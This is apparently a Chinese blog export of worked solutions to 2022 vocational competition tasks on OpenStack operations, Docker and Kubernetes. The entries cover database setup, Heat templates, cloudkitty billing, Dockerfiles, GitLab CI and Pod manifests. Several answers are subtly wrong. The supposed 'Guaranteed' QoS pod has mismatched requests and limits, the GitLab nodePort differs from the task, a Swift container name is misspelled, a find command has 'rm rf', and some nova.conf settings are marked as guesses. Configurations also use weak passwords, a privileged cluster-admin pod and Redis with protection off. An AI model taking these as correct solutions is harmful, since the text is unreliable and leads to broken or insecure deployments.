#查看share-test目录共享目录访问路径[root@controller ~]# manila show share-test | grep path | cut -d&#x27;|&#x27; -f3 path = 127.0.0.1:/var/lib/manila/mnt/share-55f94a46-9ac0-4b7e-8981-d83ac6fce8d7 #在openStack控制节点将share-test共享目录挂载至/mnt目录下[root@controller ~]# mount -t nfs 172.30.17.5:/var/lib/manila/mnt/share-c3f5a9fc-a8e7-40a6-a43b-56cfd1738724 /mnt/#查看挂载信息[root@controller ~]# df -th文件系统                                                                                                                 类型   容量  已用  可用     已用%  挂载点devtmpfs                                                                                                          devtmpfs  5.8G  0       5.8G      0%     /devtmpfs                                                                                                                     tmpfs  5.8G  68K   5.8G     1%       /dev/shmtmpfs                                                                                                                     tmpfs  5.8G 592M 5.3G     10%     /runtmpfs                                                                                                                     tmpfs  5.8G  0        5.8G     0%     /sys/fs/cgroup/dev/vda1                                                                                                                 xfs    50G   8.1G 42G     17%     /tmpfs                                                                                                                     tmpfs  1.2G   0      1.2G      0%     /run/user/0172.30.17.5:/var/lib/manila/mnt/share-c3f5a9fc-a8e7-40a6-a43b-56cfd1738724 nfs4   2.0G  6.0M  1.8G    1%     /mnt

第二套私有云运维任务：1.使用自动搭建的OpenStack平台，登录数据库，创建库test，并在库test中创建表company（表结构如(id int not null primary key,name varchar(50),addr varchar(255))所示），在表company中插入一条数据(1,”alibaba”,”china”)
#登录数据库root@controller ~]# mysql -uroot -pEnter password:MariaDB [(none)]&gt; create database test;Query OK, 1 row affected (0.000 sec)MariaDB [(none)]&gt; use test;Database changedMariaDB [test]&gt; create table company(id int not null primary key,name varchar(50),addr varchar(255));Query OK, 0 rows affected (0.003 sec)MariaDB [test]&gt; insert into company values (1,&quot;alibaba&quot;,&quot;china&quot;);Query OK, 1 row affected (0.001 sec)MariaDB [test]&gt; select * from company;+----+---------+-------+| id | name    | addr  |+----+---------+-------+|  1 | alibaba | china |+----+---------+-------+1 row in set (0.000 sec)

2.OpenStack各服务内部通信都是通过RPC来交互，各agent都需要去连接RabbitMQ；随着各服务agent增多，MQ的连接数会随之增多，最终可能会到达上限，成为瓶颈。使用提供的OpenStack私有云平台，通过修改limits.conf配置文件来修改RabbitMQ服务的最大连接数为10240
[root@controller ~]# vi /etc/security/limits.confopenstack soft     nofile  10240openstack hard     nofile  10240#在配置文件的最后添加两行内容如上,修改完之后，保存退出

3.在提供的OpenStack私有云平台上，在&#x2F;root目录下编写Heat模板create_user.yaml，创建名为heat-user的用户，属于admin项目，并赋予heat-user用户admin的权限，配置用户密码为123456。
[root@controller ~]# cat create_user.yamlheat_template_version: 2018-08-31resources:  user:    type: OS::Keystone::User    properties:      name: heat-user      password: &quot;123456&quot;      domain: demo      default_project: admin      roles: [&#123;&quot;role&quot;:&quot;admin&quot;,&quot;project&quot;:&quot;admin&quot;&#125;][root@controller ~]# openstack stack create -t create_user.yaml heat-user+---------------------+--------------------------------------+| Field               | Value                                |+---------------------+--------------------------------------+| id                  | f5bbca42-7962-49ce-b8e7-2b772544a920 || stack_name          | heat-user                            || description         | No description                       || creation_time       | 2022-10-25T07:53:28Z                 || updated_time        | None                                 || stack_status        | CREATE_IN_PROGRESS                   || stack_status_reason | Stack CREATE started                 |+---------------------+--------------------------------------+

4.在提供的OpenStack私有云平台上，使用cirros-0.3.4-x86_64-disk.img镜像，创建一个名为Gmirror1的镜像，要求启动该镜像的最小硬盘是30G、最小内存是2048M。
[root@controller ~]# openstack image create --disk-format qcow2 --container-format bare --min-disk 30 --min-ram 2048 --file ./cirros-0.3.4-x86_64-disk.img Gmirror1+------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Field            | Value                                                                                                                                                                                      |+------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| checksum         | ee1eca47dc88f4879d8a229cc70a07c6                                                                                                                                                           || container_format | bare                                                                                                                                                                                       || created_at       | 2022-10-25T07:57:28Z                                                                                                                                                                       || disk_format      | qcow2                                                                                                                                                                                      || file             | /v2/images/1acb0e45-eefa-4e64-aaed-b3f4e3d85c02/file                                                                                                                                       || id               | 1acb0e45-eefa-4e64-aaed-b3f4e3d85c02                                                                                                                                                       || min_disk         | 30                                                                                                                                                                                         || min_ram          | 2048                                                                                                                                                                                       || name             | Gmirror1                                                                                                                                                                                   || owner            | ef3705db528144cc9a33f8ace06d6d3b                                                                                                                                                           || properties       | os_hash_algo=&#x27;sha512&#x27;, os_hash_value=&#x27;1b03ca1bc3fafe448b90583c12f367949f8b0e665685979d95b004e48574b953316799e23240f4f739d1b5eb4c4ca24d38fdc6f4f9d8247a2bc64db25d6bbdb2&#x27;, os_hidden=&#x27;False&#x27; || protected        | False                                                                                                                                                                                      || schema           | /v2/schemas/image                                                                                                                                                                          || size             | 13287936                                                                                                                                                                                   || status           | active                                                                                                                                                                                     || tags             |                                                                                                                                                                                            || updated_at       | 2022-10-25T07:57:29Z                                                                                                                                                                       || virtual_size     | None                                                                                                                                                                                       || visibility       | shared                                                                                                                                                                                     |+------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

5.在提供的OpenStack私有云平台上，自行安装Swift服务，新建名为chinaskill的容器，将cirros-0.3.4-x86_64-disk.img镜像上传到chinaskill容器中，并设置分段存放，每一段大小为10M。
[root@controller ~]# swift post chinaskill[root@controller ~]# swift upload chiaskill -S 10000000 cirros-0.3.4-x86_64-disk.imgcirros-0.3.4-x86_64-disk.img segment 1cirros-0.3.4-x86_64-disk.img segment 0cirros-0.3.4-x86_64-disk.img

6.使用OpenStack私有云平台，创建两台云主机vm1和vm2，在这两台云主机上分别安装数据库服务，并配置成主从数据库，vm1节点为主库，vm2节点为从库（数据库密码设置为000000）。



vm1
192.168.200.101
主库



vm2
192.168.200.102
从库


①添加主机映射(并且关闭防火墙)
vi /etc/hosts192.168.200.101 vm1192.168.200.102 vm2

②安装并配置mariadb
yum -y install mariadb mariadb-server#启动mariadbsystemctl start mariadb#配置mysql_secure_installation  y 000000 000000 y n y y

③配置主节点
vi /etc/my.cnflog-bin=mysql-binbinlog_ignore_db=mysqlserver-id=101  #每个服务器都需要添加server_id配置，各个服务器的server_id需要保证唯一性，实践中通过设置为服务器ip地址的最后一位#重启服务systemctl restart mariadb#登录数据库mysql -uroot -p000000 #授权 -&gt; grant replication slave on *.*  to &#x27;root&#x27;@&#x27;%&#x27; identified by &#x27;000000&#x27;; -&gt; grant replication slave on *.* to &#x27;user&#x27;@&#x27;%&#x27; identified by &#x27;000000&#x27;;

④配置从节点
vi /etc/my.cnfserver-id=102log-bin=mysql-bin #重启服务systemctl restart mariadb#登录并配置mysql -uroot -p000000-&gt; change master to master_host=&#x27;vm1&#x27;,master_user=&#x27;user&#x27;,master_password=&#x27;000000-&gt; start slave;-&gt; show slave status\G;

9.使用cloudkitty计费服务，处理虚拟机实例(compute)、云硬盘(volume)、镜像(image)、网络进出流量(network.bw.in, network.bw.out)、浮动IP(network.floating)的计费数据并进行计费规则创建，以达到费用核算目的。
实例类型收费
#创建云主机服务instance_test,通过命令创建service服务[root@controller ~]# openstack rating hashmap service create instance_test+---------------+--------------------------------------+| Name          | Service ID                           |+---------------+--------------------------------------+| instance_test | cf8029bf-dc35-4e40-b8fd-5af4a4d25a30 |+---------------+--------------------------------------+#创建名为flavor_name的fieldsroot@controller ~]# openstack rating hashmap field create cf8029bf-dc35-4e40-b8fd-5af4a4d25a30 flavor_name+-------------+--------------------------------------+--------------------------------------+| Name        | Field ID                             | Service ID                           |+-------------+--------------------------------------+--------------------------------------+| flavor_name | b2f0d485-df20-4f2e-bd44-d3696971cb8f | cf8029bf-dc35-4e40-b8fd-5af4a4d25a30 |+-------------+--------------------------------------+--------------------------------------+#设置规格为m1.small的云主机单价为1元[root@controller ~]# openstack rating hashmap mapping create  --field-id b2f0d485-df20-4f2e-bd44-d3696971cb8f  -t flat --value  m1.small 1+--------------------+--------+----------+----+--------------------+----------+--------+----------+| Mapping ID         |Value   |Cost      |Type| Field ID           |Service ID|Group ID|Project ID|+--------------------+--------+----------+----+--------------------+----------+--------+----------+| c1b7d4db-c1d2-4488 |m1.small|1.00000000|flat| b2f0d485-df20-4f2e | None     | None   | None     |  -ac46-1a8eb70d76e4                            -bd44-d3696971cb8f+--------------------+--------+----------+----+--------------------+----------+--------+----------+

云硬盘服务费用
#创建云硬盘服务费用volume_size[root@controller ~]# openstack rating hashmap service create volume_size+-------------+--------------------------------------+| Name        | Service ID                           |+-------------+--------------------------------------+| volume_size | 6bd25052-eb27-49b1-ad68-aab723059a95 |+-------------+--------------------------------------+#设置价格为1.2元[root@controller ~]# openstack rating hashmap mapping create -s 6bd25052-eb27-49b1-ad68-aab723059a95 -t flat 1.2+--------------------------------------+-------+------------+------+----------+--------------------------------------+----------+------------+| Mapping ID                           | Value | Cost       | Type | Field ID | Service ID                           | Group ID | Project ID |+--------------------------------------+-------+------------+------+----------+--------------------------------------+----------+------------+| bd57621f-523b-43f2-89fb-2ea07fd04fac | None  | 1.20000000 | flat | None     | 6bd25052-eb27-49b1-ad68-aab723059a95 | None     | None       |+--------------------------------------+-------+------------+------+----------+--------------------------------------+----------+------------+

镜像服务费用
#创建镜像收费服务image_size_test[root@controller ~]# openstack rating hashmap service create image_size_test+-----------------+--------------------------------------+| Name            | Service ID                           |+-----------------+--------------------------------------+| image_size_test | 80a098cf-d793-47cf-b63e-df6cbd56e88d |+-----------------+--------------------------------------+#并为该服务单价设置为0.8元[root@controller ~]# openstack rating hashmap mapping create -s  80a098cf-d793-47cf-b63e-df6cbd56e88d   -t flat 0.8 +--------------------+-------+------------+------+----------+--------------------+--------+----------+| Mapping ID         | Value | Cost       | Type | Field ID | Service ID         |Group ID|Project ID|+--------------------+-------+------------+------+----------+--------------------+--------+----------+| 64952e70-6e37-4c8a | None  | 0.80000000 | flat | None     | 80a098cf-d793-47cf | None   | None     |  -9d3a-b4c70de1fb87                                          -b63e-df6cbd56e88d+--------------------+-------+------------+------+----------+--------------------+--------+----------

第三套OpenStack云平台运维2.在提供的OpenStack平台上，通过修改相关参数对openstack平台进行调优操作，相应的调优操作有：
（1）预留前2个物理CPU，把后面的所有CPU分配给虚拟机使用（假设vcpu为16个）；
（2）设置cpu超售比例为4倍；
vi /etc/nova/nova.conf###不知道哪个对cpu_dedicated_set = 2cpu_shared_set = 14vcpu_pin_set = 2-15cpu_allocation_ratio = 4.0

3.在提供的OpenStack平台上，对mencached服务进行操作使memcached的缓存由64MB变为256MB。
vi /etc/sysconfig/memcachedCACHESIZE=&quot;256&quot;

4.在提供的OpenStack平台上，编写heat模板createnet.yml文件，模板作用为按照要求创建一个网络和子网。
[root@controller ~]# cat createnet.ymlheat_template_version: 2018-08-31resources:  net1:    type: OS::Neutron::Net    properties:      name: net1  net-subnet:    properties:      cidr: 10.1.0.0/24      name: net1-subent      enable_dhcp: true      gateway_ip: 10.1.0.2      allocation_pools:        - start: 10.1.0.100          end: 10.1.0.200      network: &#123;get_resource: net1&#125;    type: OS::Neutron::Subnet#创建网络openstack stack create -t createnet.yml net

5.使用提供的OpenStack私有云平台，修改普通用户权限，使普通用户不能对镜像进行创建和删除操作从（参考(1条消息) OpenStack Keystone (2): 角色权限管理_hhzzk的博客-CSDN博客_openstack 角色 权限）
(2条消息) openstack 权限控制 （添加自定义角色）keystone等组件_weixin_33963594的博客-CSDN博客
vi /etc/glance/policy.json &quot;add_image&quot;: &quot;role:admin&quot;, &quot;delete_image&quot;: &quot;role:admin&quot;,

9.在OpenStack私有云平台，创建一台云主机，编写脚本，要求可以完成数据库的定期备份，并把数据库备份文件存放在&#x2F;opt目录下。
#!bin/bash#备份路径BACKUP=/root/mysql-backup#数据库的定时备份DATETIME=`date +%Y_%m_%d_%H%%M%S`#echo &quot;$DATETIME&quot;echo &quot;====start backup to $BACKUP/$DATETIME/$DATETIME.tar.gz=====&quot;#主机HOST=rabbitmqDB_USER=xyDB_PWD=000000#要备份的数据库名DATABASE=xy#创建备份的路径，如果路径不存在就创建[ ! -d &quot;$BACKUP/$DATETIME&quot; ] &amp;&amp; mkdir -p &quot;$BACKUP/$DATETIME&quot;#执行mysql的备份数据库指令mysqldump -u$&#123;DB_USER&#125; -p$&#123;DB_PWD&#125; --host=$HOST $DATABASE | gzip &gt; $BACKUP/$DATETIME/$DATETIME.sql.gz#打包备份文件cd $BACKUPtar -zcvf $DATETIME.tar.gz $DATETIME#删除临时目录rm -rf $BACKUP/$DATETIME#删除1天前的备份文件#在$backup目录下按照时间找10天前的名称为*.tar.gz的文件，-exec表示执行找到的文件find $BACKUP -mtime +1 -name &quot;*.tar.gz&quot; -exec rm rf &#123;&#125; \;echo &quot;============backup success============&quot;#加入定时任务表示每天8点30分执行后面的命令（shell脚本的路径）crontab -e30 8 * * * /root/mysql_backup.sh

]]></content>
      <categories>
        <category>云计算</category>
        <category>技能大赛汇总</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>云计算职业技能大赛</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-2022年全国职业院校技能大赛容器云</title>
    <url>/posts/9bf3df10.html</url>
    <content><![CDATA[【任务 1】容器云平台搭建[5 分]
【题目 1】平台部署–部署容器云平台[1.5 分]登录OpenStack 私有云平台，使用 CentOS7.9 镜像创建两台云主机，使用 kubeeasy 工具完成Kubernetes 1.22.1 集群的搭建。然后使用 nginx 镜像在 default 命名空间下创建一个名为exam 的Pod，并为该 Pod 设置环境变量 exam，其值为 2022。完成后提交 master 节点的用户名、密码和 IP 到答题框。
#两台节点，将提供的安装包 chinaskills_cloud_paas_v2.0.2.iso 上传至 master 节点/root 目录，并解压 到/opt 目录[root@localhost ~]# mount -o loop chinaskills_cloud_paas_v2.0.2.iso /mnt/ [root@localhost ~]# cp -rfv /mnt/* /opt/ [root@localhost ~]# umount /mnt/#安装 kubeeasy已经依赖[root@localhost ~]# mv /opt/kubeeasy /usr/bin/kubeeasy[root@localhost ~]# kubeeasy install depend \ --host 10.24.2.10,10.24.2.11 \ --user root \ --password 000000 \ --offline-file /opt/dependencies/base-rpms.tar.gz--host：所有主机节点 IP，如：10.24.1.2-10.24.1.10，中间用“-”隔开，表示 10.24.1.2 到 10.24.1.10 范围内的所有 IP。若 IP 地址不连续，则列出所有节点 IP，用逗号隔开，如： 10.24.1.2,10.24.1.7,10.24.1.9。 --user：主机登录用户，默认为 root。 --password：主机登录密码，所有节点需保持密码一致。 --offline-file：离线安装包路径。#配置 SSH 免密钥[root@localhost ~]# kubeeasy create ssh-keygen \ --master 10.24.2.10 \ --worker 10.24.2.11 \ --user root --password 000000#部署 Kubernetes 集群[root@localhost ~]# kubeeasy install kubernetes \ --master 10.24.2.10 \ --worker 10.24.2.11 \ --user root \ --password 000000 \ --version 1.22.1 \ --offline-file /opt/kubernetes.tar.gz#查看集群信息[root@k8s-master-node1 ~]# kubectl cluster-info Kubernetes control plane is running at https://apiserver.cluster.local:6443 CoreDNS is running at https://apiserver.cluster.local:6443/api/v1/namespaces/kube-system/services/kube-dns:dns/proxy To further debug and diagnose cluster problems, use &#x27;kubectl cluster-info dump&#x27;.# 参数解释--master：Master 节点 IP。 --worker：Node 节点 IP，如有多个 Node 节点用逗号隔开。 --version：Kubernetes 版本，此处只能为 1.22.1。

1.Kubernetes 集群部署成功得 1 分；2.Pod 创建成功且环境变量设置正确得 0.5 分。
【题目 2】平台部署–部署 Istio 服务网格[0.5 分]1.Kubernetes 集群部署成功得 1 分；2.Pod 创建成功且环境变量设置正确得 0.5 分。
在 Kubernetes 集群上完成 Istio 服务网格环境的安装，然后新建命名空间 exam，为该命名空间开启自动注入 Sidecar。完成后提交 master 节点的用户名、密码和 IP 到答题框。
[root@k8s-master-node1 ~]# kubeeasy add --istio istio#https://blog.csdn.net/shida_csdn/article/details/90713235[root@k8s-master-node1 ~]# kubectl create ns exam[root@k8s-master-node1 ~]# kubectl label namespace exam istio-injection=enabled

1.Istio 所有组件运行成功得 0.3 分；2.命名空间 exam 自动注入成功得 0.2 分。
【题目 3】平台部署–部署 KubeVirt 虚拟化[1 分]在 Kubernetes 集群上完成KubeVirt 虚拟化环境的安装。完成后提交 master 节点的用户名、密码和 IP 到答题框。
[root@k8s-master-node1 ~]# kubeeasy add --virt kubevirt

1.KubeVirt 所有组件运行成功得 1 分。
【题目 4】平台部署–部署 Harbor 仓库及Helm 包管理工具[1 分]在 master 节点上完成Harbor 镜像仓库及Helm 包管理工具的部署。然后使用 nginx 镜像自定义一个 Chart，Deployment 名称为 nginx，副本数为 1，然后将该 Chart 部署到 default 命名空间下，Release 名称为 web。完成后提交 master 节点的用户名、密码和 IP 到答题框。
[root@k8s-master-node1 ~]# kubeeasy add --registry harbor

1.Harbor 仓库部署成功得 0.5 分；2.Helm 工具安装成功得 0.2 分；3.Chart 包部署成功得 0.3 分。
【题目 5】集群管理–备份 ETCD 数据[1 分]Kubernetes 使用 ETCD 来存储集群的实时运行数据，为防止服务器宕机导致 Kubernetes集群数据丢失，请将Kubernetes 集群数据备份到&#x2F;root&#x2F;etcd.db 中。完成后提交 master 节点的 IP 地址、用户名和密码到答题框。
https://blog.csdn.net/lihongbao80/article/details/126508726

1.etcdctl 工具安装成功得 0.2 分；2.ETCD 数据备份成功得 0.8 分。
【任务 2】容器云应用部署：Docker Compose 编排部署[7.0 分]Hyperf 是一个高性能、高灵活性的渐进式 PHP 协程框架，内置协程服务器及大量常用的组件，性能较传统基于 PHP-FPM 的框架有质的提升，提供超高性能的同时，也保持着极其灵活的可扩展性。请根据要求完成数据库服务 MariaDB、缓存服务 Redis、微服务 Hyperf 及前端服务Nginx 按照要求进行容器化。
【题目 1】容器化 MariaDB 服务[1 分]编写Dockerfile 文件构建hyperf-mariadb:v1.0 镜像，具体要求如下：（需要用到的软件包：Hyperf.tar.gz）
（1）基础镜像：centos:7.9.2009；（2）完成 MariaDB 服务的安装；（3）声明端口：3306；（4）设置数据库 root 用户的密码为root；（5）将提供的数据库文件 hyperf_admin.sql 导入数据库；（6）设置服务开机自启。完成后构建镜像，并提交master 节点的用户名、密码和 IP 地址到答题框。
没有具体的软件包，同理的代替一下#mysql初始化自启动脚本[root@k8s-worker-node1 Pig]# cat mysql_init.sh#!/bin/bashmysql_install_db --user=rootmysqld_safe --user=root &amp;sleep 8mysqladmin -u root password &#x27;root&#x27;mysql -uroot -proot -e &quot;grant all on *.* to &#x27;root&#x27;@&#x27;%&#x27; identified by &#x27;root&#x27;; flush privileges;&quot;mysql -uroot -proot -e &quot; source /opt/pig.sql;source /opt/pig_codegen.sql;source /opt/pig_config.sql; source /opt/pig_job.sql;&quot;#本地yum源[root@k8s-worker-node1 Pig]# cat local.repo[pig]name=pigbaseurl=file:///root/yumgpgcheck=0enabled=1[root@k8s-worker-node1 Pig]# cat Dockerfile-mariadbFROM centos:centos7.9.2009MAINTAINER ChinaskillsRUN rm -rf /etc/yum.repos.d/*COPY local.repo /etc/yum.repos.d/COPY yum /root/yumENV LC_ALL en_US.UTF-8RUN yum -y install mariadb-serverCOPY mysql /opt/COPY mysql_init.sh /opt/RUN bash /opt/mysql_init.shEXPOSE 3306CMD [&quot;mysqld_safe&quot;,&quot;--user=root&quot;][root@k8s-worker-node1 Pig]# docker build -t hyperf-mariadb:v1.0 -f Dockerfile-mariadb .

1.镜像构建成功得 0.5 分；2.数据库安装且导入数据成功得 0.5 分。
【题目 2】容器化Redis 服务[1 分]
编写 Dockerfile 文件构建 hyperf-redis:v1.0 镜像，具体要求如下：（需要用到的软件包：Hyperf.tar.gz）（1）基础镜像：centos:7.9.2009；（2）安装Redis 服务；（3）关闭保护模式；（4）声明端口：6379；（5）设置服务开机自启。完成后构建镜像，并提交master 节点的用户名、密码和 IP 地址到答题框。
[root@k8s-worker-node1 Pig]# cat Dockerfile-redisFROM centos:centos7.9.2009MAINTAINER ChinaskillsRUN rm -rf /etc/yum.repos.d/*COPY local.repo /etc/yum.repos.d/COPY yum /root/yumRUN yum -y install redisRUN sed -i &#x27;s/127.0.0.1/0.0.0.0/g&#x27; /etc/redis.conf &amp;&amp; \   sed -i &#x27;s/protected-mode yes/protected-mode no/g&#x27; /etc/redis.confEXPOSE 6379CMD [&quot;/usr/bin/redis-server&quot;,&quot;/etc/redis.conf&quot;][root@k8s-worker-node1 Pig]# docker build -t  hyperf-redis:v1.0  -f Dockerfile-redis .

1.镜像构建成功的 0.5 分；2.Redis 服务安装成功且配置正确得 0.5 分。
【题目 3】容器化Nginx 服务[0.5 分]编写 Dockerfile 文件构建hyperf-nginx:v1.0 镜像，具体要求如下：（需要用到的软件包：Hyperf.tar.gz）（1）基础镜像：centos:7.9.2009；（2）安装nginx 服务；（3）声明端口：80；（4）设置服务开机自启。完成后构建镜像，并提交master 节点的用户名、密码和 IP 地址到答题框。
[root@k8s-worker-node1 Pig]# cat Dockerfile-nginxFROM centos:centos7.9.2009MAINTAINER ChinaskillsRUN rm -rf /etc/yum.repos.d/*COPY local.repo /etc/yum.repos.d/COPY yum /root/yumRUN yum -y install nginxEXPOSE 80CMD [&quot;nginx&quot;,&quot;-g&quot;,&quot;daemon off;&quot;][root@k8s-worker-node1 Pig]# docker build -t hyperf-nginx:v1.0 -f Dockerfile-nginx .

1.镜像构建成功得 0.3 分；2.Nginx 安装成功且配置正确得 0.2 分。
【题目 4】容器化Hyperf 服务[1 分]编写Dockerfile 文件构建hyperf-service:v1.0 镜像，具体要求如下：（需要用到的软件包：Hyperf.tar.gz）（1）基础镜像：centos:7.9.2009；（2）安装 PHP 及扩展；（3）使用源码编译安装Swoole。完成后构建镜像，并提交master 节点的用户名、密码和 IP 地址到答题框。
在这里插入代码片

1.镜像构建成功得 0.5 分；2.PHP 安装成功得 0.2 分；3.Swoole 安装成功得 0.3 分。
【题目 5】编排部署Hyperf 框架[3.5 分]编写&#x2F;root&#x2F;hyperf&#x2F;project&#x2F;docker-compose.yaml 文件，具体要求如下：（1）容器 1 名称：hyperf-mysql；镜像：hyperf-mariadb:v1.0；端口映射：3306:3306；（2）容器 2 名称：hyperf-redis；镜像：hyperf-redis:v1.0；（3）容器 3 名称：hyperf-ui；镜像：hyperf-nginx:v1.0；端口映射：80:8081；（4）容器 4 名称：hyperf-service；镜像：hyperf-service:v1.0。完成后编排部署Hyperf 框架，并提交master 节点的用户名、密码和 IP 地址到答题框。
在这里插入代码片

.docker-compose.yaml 文件编排成功得 1.5 分；2.8081 端口访问服务成功得 1 分；3.Hyperf-service 连接数据库和Redis 成功得 1 分。
【任务 3】容器云应用部署：基于 Kubernetes 构建 CICD[8.0 分]该公司决定采用Kubernetes + GitLab CI 来构建 CICD 环境，以缩短新功能开发上线周期，及时满足客户的需求，实现 DevOps 的部分流程，来减轻部署运维的负担，实现可视化容器生命周期管理、应用发布和版本迭代更新，请完成GitLab CI + Kubernetes 的 CICD 环境部署（构建持续集成所需要的所有软件包在软件包 CICD-Runner.tar.gz 中）。CICD 应用系统架构如下：
【题目 1】安装GitLab 环境[1 分]在Kubernetes 集群中新建命名空间gitlab-ci，将GitLab 部署到该命名空间下，Deployment和 Service 名称均为gitlab，以 NodePort 方式将 80 端口对外暴露为 30880，设置 GitLab 服务root 用户的密码为 admin@123，将项目包 demo-2048.tar.gz 导入到 GitLab 中并命名为demo-2048。完成后提交 master 节点的用户名、密码和 IP 地址到答题框。（需要用到的软件包路径CICD-Runner.tar.gz）
[root@k8s-master-node1 ~]# kubectl create ns gitlab-ci[root@k8s-master-node1 ~]# vi gitlab.yamlapiVersion: v1kind: Servicemetadata:  name: gitlab  labels:    app: gitlabspec:  type: NodePort  ports:  - name: http    port: 80                      targetPort: 80    nodePort: 30888                   selector:    app: gitlab---apiVersion: apps/v1kind: Deploymentmetadata:  name: gitlab  labels:    app: gitlabspec:  selector:    matchLabels:      app: gitlab  template:    metadata:      labels:        app: gitlab    spec:      serviceAccountName: gitlab-admin      containers:      - name: gitlab        image: gitlab/gitlab-ce:latest        imagePullPolicy: IfNotPresent        securityContext:           runAsUser: 0                             privileged: true        env:        - name: GITLAB_ROOT_PASSWORD          value: admin@123                      ports:        - name: http          containerPort: 80        volumeMounts:        - mountPath: /etc/gitlab          name: gitlabhome        - mountPath: /var/log/gitlab          name: loghome        - mountPath: /var/opt/gitlab          name: opthome      volumes:      - name: gitlabhome        hostPath:          path: /svc/gitlab/config      - name: loghome        hostPath:          path: /svc/gitlab/gitlab/logs      - name: opthome        hostPath:          path: /svc/gitlab/gitlab/data---apiVersion: v1kind: ServiceAccountmetadata:  name: gitlab-admin  labels:    name: gitlab---kind: ClusterRoleBindingapiVersion: rbac.authorization.k8s.io/v1metadata:  name: gitlab-admin  labels:    name: gitlabsubjects:  - kind: ServiceAccount    name: gitlab-admin    namespace: defaultroleRef:  kind: ClusterRole  name: cluster-admin  apiGroup: rbac.authorization.k8s.io

1.GitLab 部署正确且能正常访问得 0.5 分；2.项目导入成功得 0.5 分。
【题目 2】部署GitLab Runner[2 分]将 GitLab Runner 部署到 gitlab-ci 命名空间下，Release 名称为 gitlab-runner，为 GitLab Runner 创建持久化构建缓存目录&#x2F;home&#x2F;gitlab-runner&#x2F;ci-build-cache 以加速构建速度，并将其注册到 GitLab 中。完成后提交 master 节点的用户名、密码和 IP 地址到答题框。（需要用到的软件包路径CICD-Runner.tar.gz）
参考链接；https://www.qikqiak.com/post/gitlab-runner-install-on-k8s/

1.GitLab Runner 部署成功得 0.5 分；2.GitLab Runner 注册成功得 0.5 分；3.GitLab Runner 持久化配置成功得 1 分。
【题目 3】配置GitLab[1.5 分]将 Kubernetes 集群添加到 demo-2048 项目中，并命名为 kubernetes-agent，项目命名空间选择 gitlab-ci。完成后提交 master 节点的用户名、密码和 IP 地址到答题框。（需要用到的软件包路径CICD-Runner.tar.gz）
1.GitLab Agent 安装成功得 1 分；2.Kubernetes 连接成功得 0.5 分。
【题目 4】构建CICD[3.5 分]编写流水线脚本.gitlab-ci.yml 触发自动构建，具体要求如下：（1）基于镜像 maven:3.6-jdk-8 构建项目的drone 分支；（2）构建镜像的名称：demo:latest；（3）将镜像推送到Harbor 仓库 demo 项目中；（4）将 demo-2048 应用自动发布到Kubernetes 集群 gitlab-ci 命名空间下。完成后提交 master 节点的用户名、密码和 IP 地址到答题框。（需要用到的软件包路径CICD-Runner.tar.gz）
1.项目变异成功得 0.5 分；2.镜像构建成功得 1 分；3.服务发布成功得 1 分；4.服务能正常访问得 1 分。
【任务 4】容器云服务运维：Kubernetes 基于容器的运维[6 分]【题目 1】Pod 管理–创建 Pod[0.5 分]在 default 命名空间下使用nginx:latest 镜像创建一个QoS 类为 Guaranteed 的 Pod，名称为 qos-demo。完成后提交 master 节点的 IP 地址、用户名和密码到答题框。
apiVersion: v1kind: Podmetadata:  name: qos-demo  namespace: defaultspec:  containers:  - name: qos-demo    image: nginx:latest    imagePullPolicy: IfNotPresent    resources:      limits:        memory: &quot;200Mi&quot;      requests:        memory: &quot;100Mi&quot;

1.Pod 创建成功得 0.2 分；2.Pod QoS 类型为Guaranteed 得 0.3 分。
【题目 2】安全管理–配置 Pod 安全上下文[0.5 分]使用 busybox 镜像启动一个名为 context-demo 的 Pod，为该 Pod 配置安全上下文，要求容器内以用户 1000 和用户组 3000 来运行所有进程，并在启动时执行“sleep 1h”命令。完成后提交 master 节点的 IP 地址、用户名和密码到答题框。
apiVersion: v1kind: Podmetadata:  name: context-demospec:  securityContext:    runAsUser: 1000    runAsGroup: 3000    fsGroup: 2000  containers:  - name: context-demo    image: busybox:latest    imagePullPolicy: IfNotPresent    command: [ &quot;sh&quot;, &quot;-c&quot;, &quot;sleep 1h&quot; ]    securityContext:      allowPrivilegeEscalation: false

1.Pod 安全上下午配置正确得 0.5 分。
【题目 3】CRD 管理–创建自定义资源类型[0.5 分]在 Kubernetes 集群中自定义一种资源类型 Student，API 为 stable.example.com&#x2F;v1，单数形式为 student，复数形式为 students，简写为 stu，作用域为命名空间级，然后在 default 命名空间下创建一个名为 exam 的 Student 对象。完成后提交 master 节点的 IP 地址、用户名和密码到答题框。


1.资源类型 Student 定义成功的 0.3 分；2.exam 创建成功得 0.2 分。
【题目 4】解析管理–添加主机别名到 Pod[0.5 分]使用 nginx 镜像在 default 命名空间下创建一个名为 nginx 的 Pod，并在 Pod 的&#x2F;etc&#x2F;hosts 中添加 IP 地址 127.0.0.1 与 chinaskills 的解析。完成后提交 master 节点的 IP 地址、用户名和密码到答题框。
apiVersion: v1kind: Podmetadata:  name: nginxspec:  restartPolicy: Never  hostAliases:  - ip: &quot;127.0.0.1&quot;    hostnames:    - &quot;chinaskills&quot;  containers:  - name: ngnix    image: nginx:latest    imagePullPolicy: IfNotPresent    command:    - cat    args:    - &quot;/etc/hosts&quot;
1.自定义解析配置正确得 0.5 分。
【题目 5】HPA 管理–创建 HPA 规则[1 分]默认情况下 HPA 是无法调整伸缩灵敏度的，但不同的业务场景对伸缩灵敏度的要求不一样。要求在 default 命名空间下使用 nginx 镜像创建一个名为 web 的 deployment，自定义HPA 的伸缩灵敏度，为该deployment 创建一个名为web 的HPA，扩容时立即新增当前 9 倍数量的副本数，时间窗口为 5s，伸缩范围为 1–1000。例如一开始只有 1 个 Pod，当 CPU 使用率超过 80%时，Pod 数量变化趋势为：1 → 10 → 100 → 1000。完成后提交 master 节点的 IP 地址、用户名和密码到答题框。
